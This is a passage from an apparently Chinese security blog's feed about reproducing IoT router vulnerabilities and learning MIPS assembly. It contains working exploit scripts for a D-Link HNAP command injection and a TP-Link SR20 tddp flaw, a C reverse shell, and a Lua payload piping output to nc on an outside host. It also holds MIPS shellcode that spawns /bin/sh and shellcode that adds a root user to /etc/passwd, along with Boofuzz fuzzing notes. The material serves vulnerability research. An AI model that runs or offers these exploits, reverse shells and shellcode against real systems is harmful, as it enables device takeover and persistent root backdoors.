class="lozad"></p><p><img alt="image-20200714152223040" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200714152223040.png" class="lozad"></p><p><img alt="" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200714153442471.png" class="lozad"></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line">IP=<span class="string">'192.168.0.1'</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#出入要执行的命令</span></span><br><span class="line">command = <span class="string">"'`ifconfig &gt; /web_mtn/hack_by_nocbtm.txt`'"</span></span><br><span class="line">length = len(command)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#构造报文的头部</span></span><br><span class="line">headers = requests.utils.default_headers()</span><br><span class="line">headers[<span class="string">"Content-Length"</span>]=str(length)</span><br><span class="line">headers[<span class="string">"User-Agent"</span>] = <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"</span></span><br><span class="line">headers[<span class="string">"SOAPAction"</span>] = <span class="string">'"http://purenetworks.com/HNAP1/GetClientInfo"'</span></span><br><span class="line">headers[<span class="string">"Content-Type"</span>] = <span class="string">"text/xml; charset=UTF-8"</span></span><br><span class="line">headers[<span class="string">"Accept"</span>]=<span class="string">"*/*"</span></span><br><span class="line">headers[<span class="string">"Accept-Encoding"</span>]=<span class="string">"gzip, deflate"</span></span><br><span class="line">headers[<span class="string">"Accept-Language"</span>]=<span class="string">"zh-CN,zh;q=0.9,en;q=0.8"</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#发送攻击payload</span></span><br><span class="line">payload = command</span><br><span class="line">r = requests.post(<span class="string">'http://'</span>+IP+<span class="string">'/HNAP1/'</span>, headers=headers, data=payload)</span><br></pre></td></tr></table></figure><p><img alt="image-20200714160840955" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200714160840955.png" class="lozad"></p><h3 id="revershell-c"><a href="#revershell-c" class="headerlink" title="revershell.c"></a>revershell.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Simple reverse shell revershell.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">daemon(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line">attacker_addr.sin_family = AF_INET;</span><br><span class="line">attacker_addr.sin_port = htons(<span class="number">4444</span>);</span><br><span class="line">attacker_addr.sin_addr.s_addr = inet_addr(<span class="string">"192.168.1.2"</span>);</span><br><span class="line"><span class="keyword">if</span>(connect(sock, (struct sockaddr *)&amp;attacker_addr,<span class="keyword">sizeof</span>(attacker_addr))!=<span class="number">0</span>)</span><br><span class="line">_exit(<span class="number">0</span>);</span><br><span class="line">dup2(sock, <span class="number">0</span>);</span><br><span class="line">dup2(sock, <span class="number">1</span>);</span><br><span class="line">dup2(sock, <span class="number">2</span>);</span><br><span class="line">execl(<span class="string">"/bin/sh"</span>, <span class="string">"/bin/sh"</span>, <span class="string">"-i"</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img alt="image-20200714191623780" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200714191623780.png" class="lozad"></p><h2 id="TP-Link-SR20-tddp命令执行"><a href="#TP-Link-SR20-tddp命令执行" class="headerlink" title="TP-Link SR20  tddp命令执行"></a>TP-Link SR20  tddp命令执行</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>tddp服务，在读取文件时，使用了<code>luaL_loadfile</code>加载文件，并且后面<code>lua_pcall</code>了文件里面的内容，没有做一些检查</p><p>文件里面写入 lua函数就可以调用执行。</p><p><img alt="image-20200715190223094" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200715190223094.png" class="lozad"></p><p><img alt="image-20200715194713510" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200715194713510.png" class="lozad"></p><p><img alt="image-20200715194632042" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200715194632042.png" class="lozad"></p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Copyright 2019 Google LLC.</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: Apache-2.0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Create a file in your tftp directory with the following contents:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#function config_test(config)</span></span><br><span class="line"><span class="comment">#  os.execute("telnetd -l /bin/login.sh")</span></span><br><span class="line"><span class="comment">#end</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Execute script as poc.py remoteaddr filename</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">port_send = <span class="number">1040</span></span><br><span class="line">port_receive = <span class="number">61000</span></span><br><span class="line"> </span><br><span class="line">tddp_ver = <span class="string">"01"</span></span><br><span class="line">tddp_command = <span class="string">"31"</span></span><br><span class="line">tddp_req = <span class="string">"01"</span></span><br><span class="line">tddp_reply = <span class="string">"00"</span></span><br><span class="line">tddp_padding = <span class="string">"%0.16X"</span> % <span class="number">00</span></span><br><span class="line"> </span><br><span class="line">tddp_packet = <span class="string">""</span>.join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])</span><br><span class="line"> </span><br><span class="line">sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">sock_receive.bind((<span class="string">''</span>, port_receive))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Send a request</span></span><br><span class="line">sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">packet = binascii.unhexlify(tddp_packet)</span><br><span class="line">argument = <span class="string">"%s;arbitrary"</span> % sys.argv[<span class="number">2</span>]</span><br><span class="line">packet = packet + argument.encode()</span><br><span class="line">sock_send.sendto(packet, (sys.argv[<span class="number">1</span>], port_send))</span><br><span class="line">sock_send.close()</span><br><span class="line"> </span><br><span class="line">response, addr = sock_receive.recvfrom(<span class="number">1024</span>)</span><br><span class="line">r = response.encode(<span class="string">'hex'</span>)</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">config_test</span><span class="params">(config)</span></span></span><br><span class="line">  <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">"id | nc 10.10.10.1 1337"</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><img alt="image-20200715165115729" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200715165115729.png" class="lozad"></p><p>反弹shell</p><p><img alt="image-20200715185253238" data-src="F:\ubuntu_share\iot\分析模板\TP-Link SR20\利用成功截图证明和视频\image-20200715185253238.png" class="lozad"></p><h2 id="UART接口"><a href="#UART接口" class="headerlink" title="UART接口"></a>UART接口</h2><p><img alt="image-20200720142830325" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200720142830325.png" class="lozad"></p><p><img alt="image-20200720142757253" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200720142757253.png" class="lozad"></p><h3 id="接口调试工具"><a href="#接口调试工具" class="headerlink" title="接口调试工具"></a>接口调试工具</h3><p><img alt="image-20200720143039864" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200720143039864.png" class="lozad"></p><h3 id="波特率"><a href="#波特率" class="headerlink" title="波特率"></a>波特率</h3><p><img alt="image-20200720143201264" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200720143201264.png" class="lozad"></p><p><img alt="image-20200724141742030" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200724141742030.png" class="lozad"></p><h2 id="BOOFUZZ流程"><a href="#BOOFUZZ流程" class="headerlink" title="BOOFUZZ流程"></a>BOOFUZZ流程</h2><p><img alt="image-20200721101153708" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200721101153708.png" class="lozad"></p><p><img alt="image-20200720161547905" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200720161547905.png" class="lozad"></p><p>0x01 Boofuzz虚拟环境创建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install python3-pip python3-venv build-essential</span><br><span class="line">$ mkdir boofuzz &amp;&amp; cd boofuzz</span><br><span class="line">$ python3 -m venv env</span><br><span class="line">$ source env/bin/activate</span><br></pre></td></tr></table></figure><p>0x02 Boofuzz安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(env) $ pip install boofuzz</span><br></pre></td></tr></table></figure><p>0x03 Boofuzz框架主要层</p><ul><li>数据生成：根据协议格式利用原语来构造请求</li><li>会话管理/驱动：将请求以图的形式链接起来形成会话，同时管理待测目标、代理、请求，还提供一个web界面用于监视和控制</li><li>代理：与目标进行交互以实现日志记录、对网络流量进行监控等<br>通常，代理是运行在目标设备上。但是，对于IoT设备而言，大部分情况下都无法在目标设备上运行代理程序。</li><li>实用工具：独立的命令行工具，完成一些其他的功能</li></ul><p>0x04 Boofuzz测试的主要步骤</p><ul><li>根据网络数据包构造请求</li><li>设置会话信息(包括测试目标的ip地址和端口等)，然后按照请求的先后顺序将其链接起来</li><li>添加对目标设备的监控和设备重启机制等</li><li>开始fuzz</li></ul><p>0x05 Boofuzz常用语法</p><ul><li>session():建立会话模块</li></ul><ul><li>s_initialize:初始化模块</li></ul><ul><li><p>call_back:回调函数</p><p>根据每个节点进行操作，定义回调函数以实现根据相应结果执行制</p></li></ul><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><p>后台 127.0.0.1:26000</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boo open ./test.db</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;虽然通过官网下载固件的方法比较便捷，但是有些厂商并不会提供固件的下载链接，这就需要我们通过其他途径来获取固件。使用从硬件设备提取固件的方法会
      
    
    </summary>
    
      <category term="iot" scheme="https://nocbtm.github.io/categories/iot/"/>
    
    
      <category term="iot" scheme="https://nocbtm.github.io/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>mips 汇编语言</title>
    <link href="https://nocbtm.github.io/2020/06/06/mips-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    <id>https://nocbtm.github.io/2020/06/06/mips-汇编语言/</id>
    <published>2020-06-06T09:47:28.000Z</published>
    <updated>2020-06-11T00:55:46.211Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近要着手去做一些路由器的漏洞复现，了解到路由器大多都是<code>mips</code>架构的，像<code>TP-Link</code>的路由器；</p><p>还有<code>arm</code>架构的，像华为，小米的路由器。</p><p>根据之前学习<code>X86</code>下的汇编和做过<code>arm-pwn</code>的经验，其实很容易掌握<code>mips</code>汇编，更容易抓住重点。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>1.<code>MIPS</code>使用定长指令，所有指令都是32位长的<br>2.1字节=8位，半字长=2个字节（32位），1字长=4个字节<br>3.一个字符空间=1个字节<br>4.一个整形=一个字长=4个字节<br>5.单个字符用单引号<br>6.字符串用双引号</p><h2 id="register"><a href="#register" class="headerlink" title="register"></a>register</h2><p>一共有32个寄存器一般用助记符表示</p><ul><li>MIPS下一共有32个通用寄存器</li><li>在汇编中，寄存器标志以$开头</li><li>寄存器表示可以有两种方式：<br>1.直接使用该寄存器对应的编号，例如：从$0到$31<br>2.使用对应的寄存器名称，例如t1,t1,sp，详见下文</li><li>对于以上两者，不存在直接寻址，必须通过<code>mfhi(“move from hi”)</code>和<code>mflo(“move from lo”)</code>分别来进行访问对应的内容。</li><li>栈的走向是从高地址向低地址</li></ul><p><img alt="" data-src="https://nocbtm.github.io/imgs/mips-asm-1.png" class="lozad"></p><h2 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h2><p>指令的话没必要全部都看反正看了也记不住，留一个基本的指令集来查询吧 <a href="https://blog.csdn.net/yixilee/article/details/4316617" target="_blank" rel="noopener">MIPS指令集</a></p><p>值得注意的是 <code>MIPS</code>有三种指令格式，而且所有的指令都是32位长，这点跟<code>X86</code>的很不一样。</p><p>通过写 <code>shellcode</code>可以更好的掌握汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sh=<span class="string">'''</span></span><br><span class="line">li $v0,<span class="number">0x6e69622f</span></span><br><span class="line">sw $v0,<span class="number">0</span>($sp)</span><br><span class="line">li $v0,<span class="number">0x0068732f</span></span><br><span class="line">sw $v0,<span class="number">4</span>($sp)</span><br><span class="line">addiu $a0,$sp,<span class="number">0</span></span><br><span class="line">li $v0,<span class="number">4011</span></span><br><span class="line">li $a1,<span class="number">0</span></span><br><span class="line">li $a2,<span class="number">0</span></span><br><span class="line">syscall</span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Title:  Linux/MIPS - execve /bin/sh - 48 bytes</span></span><br><span class="line"><span class="comment">   Date:   2011-11-24</span></span><br><span class="line"><span class="comment">   Author: rigan - imrigan [at] gmail.com</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">        .text</span></span><br><span class="line"><span class="comment">        .global __start</span></span><br><span class="line"><span class="comment">__start:</span></span><br><span class="line"><span class="comment">        slti $a2, $zero, -1</span></span><br><span class="line"><span class="comment">        li $t7, 0x2f2f6269</span></span><br><span class="line"><span class="comment">        sw $t7, -12($sp)</span></span><br><span class="line"><span class="comment">        li $t6, 0x6e2f7368</span></span><br><span class="line"><span class="comment">        sw $t6, -8($sp)</span></span><br><span class="line"><span class="comment">        sw $zero, -4($sp)</span></span><br><span class="line"><span class="comment">        la $a0, -12($sp)</span></span><br><span class="line"><span class="comment">        slti $a1, $zero, -1</span></span><br><span class="line"><span class="comment">        li $v0, 4011</span></span><br><span class="line"><span class="comment">        syscall 0x40404</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> sc[] = &#123;</span><br><span class="line">        <span class="string">"\x28\x06\xff\xff"</span>        <span class="comment">/* slti    a2,zero,-1   */</span></span><br><span class="line">        <span class="string">"\x3c\x0f\x2f\x2f"</span>        <span class="comment">/* lui     t7,0x2f2f    */</span></span><br><span class="line">        <span class="string">"\x35\xef\x62\x69"</span>        <span class="comment">/* ori     t7,t7,0x6269 */</span></span><br><span class="line">        <span class="string">"\xaf\xaf\xff\xf4"</span>        <span class="comment">/* sw      t7,-12(sp)   */</span></span><br><span class="line">        <span class="string">"\x3c\x0e\x6e\x2f"</span>        <span class="comment">/* lui     t6,0x6e2f    */</span></span><br><span class="line">        <span class="string">"\x35\xce\x73\x68"</span>        <span class="comment">/* ori     t6,t6,0x7368 */</span></span><br><span class="line">        <span class="string">"\xaf\xae\xff\xf8"</span>        <span class="comment">/* sw      t6,-8(sp)    */</span></span><br><span class="line">        <span class="string">"\xaf\xa0\xff\xfc"</span>        <span class="comment">/* sw      zero,-4(sp)  */</span></span><br><span class="line">        <span class="string">"\x27\xa4\xff\xf4"</span>        <span class="comment">/* addiu   a0,sp,-12    */</span></span><br><span class="line">        <span class="string">"\x28\x05\xff\xff"</span>        <span class="comment">/* slti    a1,zero,-1   */</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xab"</span>        <span class="comment">/* li      v0,4011      */</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">/* syscall 0x40404      */</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="keyword">void</span>(*s)(<span class="keyword">void</span>);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"size: %d\n"</span>, <span class="built_in">strlen</span>(sc));</span><br><span class="line">       s = sc;</span><br><span class="line">       s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Title:  Linux/MIPS - add user(UID 0) with password - 164 bytes</span></span><br><span class="line"><span class="comment"> * Date:   2011-11-24</span></span><br><span class="line"><span class="comment"> * Author: rigan - imrigan [at] gmail.com</span></span><br><span class="line"><span class="comment"> * Note:</span></span><br><span class="line"><span class="comment"> *         Username - rOOt</span></span><br><span class="line"><span class="comment"> *         Password - pwn3d</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> sc[] =</span><br><span class="line">        <span class="string">"\x24\x09\x73\x50"</span>       <span class="comment">//  li      t1,29520</span></span><br><span class="line">        <span class="string">"\x05\x30\xff\xff"</span>       <span class="comment">//  bltzal  t1,400094 &lt;L&gt;</span></span><br><span class="line">        <span class="string">"\x24\x09\x73\x50"</span>       <span class="comment">//  li      t1,29520 (nop)</span></span><br><span class="line">     </span><br><span class="line">        <span class="comment">/* open("/etc/passwd", O_WRONLY|O_CREAT|O_APPEND); */</span></span><br><span class="line">        <span class="string">"\x3c\x0f\x30\x2f"</span>       <span class="comment">//  lui     t7,0x302f</span></span><br><span class="line">        <span class="string">"\x35\xef\x65\x74"</span>       <span class="comment">//  ori     t7,t7,0x6574</span></span><br><span class="line">        <span class="string">"\x3c\x0e\x63\x2f"</span>       <span class="comment">//  lui     t6,0x632f   </span></span><br><span class="line">        <span class="string">"\x35\xce\x70\x61"</span>       <span class="comment">//  ori     t6,t6,0x7061</span></span><br><span class="line">        <span class="string">"\x3c\x0d\x73\x73"</span>       <span class="comment">//  lui     t5,0x7373</span></span><br><span class="line">        <span class="string">"\x35\xad\x77\x64"</span>       <span class="comment">//  ori     t5,t5,0x7764</span></span><br><span class="line">        <span class="string">"\xaf\xaf\xff\xf3"</span>       <span class="comment">//  sw      t7,-13(sp)</span></span><br><span class="line">        <span class="string">"\xaf\xae\xff\xf7"</span>       <span class="comment">//  sw      t6,-9(sp)</span></span><br><span class="line">        <span class="string">"\xaf\xad\xff\xfb"</span>       <span class="comment">//  sw      t5,-5(sp)</span></span><br><span class="line">        <span class="string">"\xaf\xa0\xff\xff"</span>       <span class="comment">//  sw      zero,-1(sp)</span></span><br><span class="line">        <span class="string">"\x27\xa4\xff\xf4"</span>       <span class="comment">//  addiu   a0,sp,-12</span></span><br><span class="line">        <span class="string">"\x24\x05\x01\x6d"</span>       <span class="comment">//  li      a1,365</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xa5"</span>       <span class="comment">//  li      v0,4005</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>       <span class="comment">//  syscall 0x40404</span></span><br><span class="line"> </span><br><span class="line">        <span class="string">"\xaf\xa2\xff\xfc"</span>       <span class="comment">//  sw      v0,-4(sp)</span></span><br><span class="line">     </span><br><span class="line">        <span class="comment">/* write(fd, "rOOt:XJ1GV.nyFFMoI:0:0:root:/root:/bin/bash\n", 45); */</span></span><br><span class="line">        <span class="string">"\x8f\xa4\xff\xfc"</span>       <span class="comment">//  lw      a0,-4(sp)</span></span><br><span class="line">        <span class="string">"\x23\xe5\x10\x0c"</span>       <span class="comment">//  addi    a1,ra,4108</span></span><br><span class="line">        <span class="string">"\x20\xa5\xf0\x60"</span>       <span class="comment">//  addi    a1,a1,-4000</span></span><br><span class="line">        <span class="string">"\x24\x09\xff\xd3"</span>       <span class="comment">//  li      t1,-45</span></span><br><span class="line">        <span class="string">"\x01\x20\x30\x27"</span>       <span class="comment">//  nor     a2,t1,zero</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xa4"</span>       <span class="comment">//  li      v0,4004</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>       <span class="comment">//  syscall 0x40404</span></span><br><span class="line">         </span><br><span class="line">        <span class="comment">/* close(fd); */</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xa6"</span>       <span class="comment">//  li      v0,4006</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>       <span class="comment">//  syscall 0x40404</span></span><br><span class="line">     </span><br><span class="line">        <span class="comment">/* exit(0);  */</span></span><br><span class="line">        <span class="string">"\x28\x04\xff\xff"</span>        <span class="comment">//  slti    a0,zero,-1</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xa1"</span>        <span class="comment">//  li      v0,4001</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">//  syscall 0x40404</span></span><br><span class="line">      </span><br><span class="line">        <span class="comment">/*  "rOOt:XJ1GV.nyFFMoI:0:0:root:/root:/bin/bash\n" */</span></span><br><span class="line">        <span class="string">"\x72\x4f\x4f\x74"</span>       </span><br><span class="line">        <span class="string">"\x3a\x58\x4a\x31"</span>       </span><br><span class="line">        <span class="string">"\x47\x56\x2e\x6e"</span>       </span><br><span class="line">        <span class="string">"\x79\x46\x46\x4d"</span>       </span><br><span class="line">        <span class="string">"\x6f\x49\x3a\x30"</span>       </span><br><span class="line">        <span class="string">"\x3a\x30\x3a\x72"</span>       </span><br><span class="line">        <span class="string">"\x6f\x6f\x74\x3a"</span>       </span><br><span class="line">        <span class="string">"\x2f\x72\x6f\x6f"</span>      </span><br><span class="line">        <span class="string">"\x74\x3a\x2f\x62"</span>      </span><br><span class="line">        <span class="string">"\x69\x6e\x2f\x62"</span>       </span><br><span class="line">        <span class="string">"\x61\x73\x68\x0a"</span>;       </span><br><span class="line">       </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="keyword">void</span>(*s)(<span class="keyword">void</span>);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"size: %d\n"</span>, <span class="built_in">strlen</span>(sc));</span><br><span class="line">       s = sc;</span><br><span class="line">       s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 